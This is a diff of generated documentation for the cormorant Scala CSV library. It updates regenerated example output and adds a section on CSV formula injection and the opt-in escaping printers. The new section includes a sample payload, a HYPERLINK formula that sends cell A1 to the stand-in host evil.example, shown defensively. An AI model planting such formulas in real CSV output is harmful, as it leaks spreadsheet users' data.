@@ -81,6 +81,7 @@
   <ul class="nav-list">
     <li class="level1 nav-leaf"><a href="#project-goals">Project Goals</a></li>
     <li class="level1 nav-leaf"><a href="#quick-start">Quick Start</a></li>
+    <li class="level1 nav-leaf"><a href="#writing-csv-that-may-be-opened-in-a-spreadsheet">Writing CSV that may be opened in a spreadsheet</a></li>
   </ul>
 
   <p class="footer"></p>
@@ -120,9 +121,9 @@
         <pre><code class="nohighlight"><span class="keyword">case</span><span> </span><span class="keyword">class</span><span> </span><span class="type-name">Bar</span><span>(</span><span class="identifier">a</span><span>: </span><span class="type-name">String</span><span>, </span><span class="identifier">b</span><span>: </span><span class="type-name">Int</span><span>, </span><span class="identifier">c</span><span>: </span><span class="type-name">Long</span><span>, </span><span class="identifier">d</span><span>: </span><span class="type-name">Option</span><span>[</span><span class="type-name">UUID</span><span>], </span><span class="identifier">e</span><span>: </span><span class="type-name">Instant</span><span>)
 
 </span><span class="keyword">implicit</span><span> </span><span class="keyword">val</span><span> </span><span class="identifier">lr</span><span>: </span><span class="type-name">LabelledRead</span><span>[</span><span class="type-name">Bar</span><span>] = </span><span class="identifier">deriveLabelledRead</span><span>
-</span><span class="comment">// lr: LabelledRead[Bar] = io.chrisdavenport.cormorant.generic.semiauto$$anon$4@2a27e89e
+</span><span class="comment">// lr: LabelledRead[Bar] = io.chrisdavenport.cormorant.generic.semiauto$$anon$4@65a7b37b
 </span><span class="keyword">implicit</span><span> </span><span class="keyword">val</span><span> </span><span class="identifier">lw</span><span>: </span><span class="type-name">LabelledWrite</span><span>[</span><span class="type-name">Bar</span><span>] = </span><span class="identifier">deriveLabelledWrite</span><span>
-</span><span class="comment">// lw: LabelledWrite[Bar] = io.chrisdavenport.cormorant.generic.semiauto$$anon$2@48947c63
+</span><span class="comment">// lw: LabelledWrite[Bar] = io.chrisdavenport.cormorant.generic.semiauto$$anon$2@25e9547d
 </span><span>
 </span><span class="comment">// A List of A given derived type
 // Don&#39;t use Instant.Now or UUID.randomUUID in pure code in the real world please.
@@ -135,8 +136,8 @@
 //     a = &quot;Yellow&quot;,
 //     b = 3,
 //     c = 5L,
-//     d = Some(value = 8bbfd843-dfba-40f2-bb18-16098d5cd61d),
-//     e = 2026-09-25T20:52:51.101618Z
+//     d = Some(value = 997c7a86-da1e-40e2-9f0f-45c57dc124b8),
+//     e = 2026-09-26T14:26:25.085206Z
 //   ),
 //   Bar(
 //     a = &quot;Boo&quot;,
@@ -150,7 +151,7 @@
 </span><span class="comment">// From Type to String
 </span><span class="keyword">val</span><span> </span><span class="identifier">csv</span><span> = </span><span class="identifier">l</span><span>.</span><span class="identifier">writeComplete</span><span>.</span><span class="identifier">print</span><span>(</span><span class="type-name">Printer</span><span>.</span><span class="keyword">default</span><span>)
 </span><span class="comment">// csv: String = &quot;&quot;&quot;a,b,c,d,e
-// Yellow,3,5,8bbfd843-dfba-40f2-bb18-16098d5cd61d,2026-09-25T20:52:51.101618Z
+// Yellow,3,5,997c7a86-da1e-40e2-9f0f-45c57dc124b8,2026-09-26T14:26:25.085206Z
 // Boo,7,6,,+1000000000-12-31T23:59:59.999999999Z&quot;&quot;&quot;
 </span><span>
 </span><span class="comment">// From String to Type
@@ -164,8 +165,8 @@
 //       a = &quot;Yellow&quot;,
 //       b = 3,
 //       c = 5L,
-//       d = Some(value = 8bbfd843-dfba-40f2-bb18-16098d5cd61d),
-//       e = 2026-09-25T20:52:51.101618Z
+//       d = Some(value = 997c7a86-da1e-40e2-9f0f-45c57dc124b8),
+//       e = 2026-09-26T14:26:25.085206Z
 //     ),
 //     Bar(
 //       a = &quot;Boo&quot;,
@@ -176,6 +177,33 @@
 //     )
 //   )
 // )</span></code></pre>
+        
+        <h2 id="writing-csv-that-may-be-opened-in-a-spreadsheet" class="section"><a class="anchor-link left" href="#writing-csv-that-may-be-opened-in-a-spreadsheet"><i class="icofont-laika link">&#xef71;</i></a>Writing CSV that may be opened in a spreadsheet</h2>
+        <p><code>Printer.default</code> implements RFC 4180 quoting, which is what a CSV <em>parser</em>
+        needs. It does not defend against formula injection: a spreadsheet opening a
+        CSV file directly will evaluate a field beginning with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, a
+        tab or a carriage return. A file built from untrusted input can therefore
+        carry a payload to whoever opens it.</p>
+        <p>If your output may be opened in a spreadsheet, use the escaping printers,
+        which prefix such a value with a single quote:</p>
+        <pre class="keep-together pdf epub"><code class="nohighlight"><span class="keyword">val</span><span> </span><span class="identifier">hostile</span><span> = </span><span class="type-name">CSV</span><span>.</span><span class="type-name">Field</span><span>(</span><span class="string-literal">&quot;&quot;&quot;=HYPERLINK(&quot;http://evil.example/?&quot;&amp;A1,&quot;click&quot;)&quot;&quot;&quot;</span><span>)
+</span><span class="comment">// hostile: CSV.Field = Field(
+//   x = &quot;=HYPERLINK(\&quot;http://evil.example/?\&quot;&amp;A1,\&quot;click\&quot;)&quot;
+// )
+</span><span>
+</span><span class="comment">// RFC 4180 only -- the formula survives
+</span><span class="type-name">Printer</span><span>.</span><span class="keyword">default</span><span>.</span><span class="identifier">print</span><span>(</span><span class="identifier">hostile</span><span>)
+</span><span class="comment">// res0: String = &quot;\&quot;=HYPERLINK(\&quot;\&quot;http://evil.example/?\&quot;\&quot;&amp;A1,\&quot;\&quot;click\&quot;\&quot;)\&quot;&quot;
+</span><span>
+</span><span class="comment">// Neutralised
+</span><span class="type-name">Printer</span><span>.</span><span class="identifier">defaultEscapingFormulas</span><span>.</span><span class="identifier">print</span><span>(</span><span class="identifier">hostile</span><span>)
+</span><span class="comment">// res1: String = &quot;\&quot;&#39;=HYPERLINK(\&quot;\&quot;http://evil.example/?\&quot;\&quot;&amp;A1,\&quot;\&quot;click\&quot;\&quot;)\&quot;&quot;</span></code></pre>
+        <p><code>Printer.tsvEscapingFormulas</code> and <code>Printer.genericEscapingFormulas</code> are the
+        equivalents of <code>tsv</code> and <code>generic</code>.</p>
+        <p>This is opt-in rather than the default because prefixing changes the bytes
+        written, and plenty of CSV is consumed by another program rather than a
+        person, where an unexpected <code>&#39;</code> would be a bug. Choose the escaping printers
+        at the point where you know the output is destined for a spreadsheet.</p>
 
         
 <hr class="footer-rule"/>
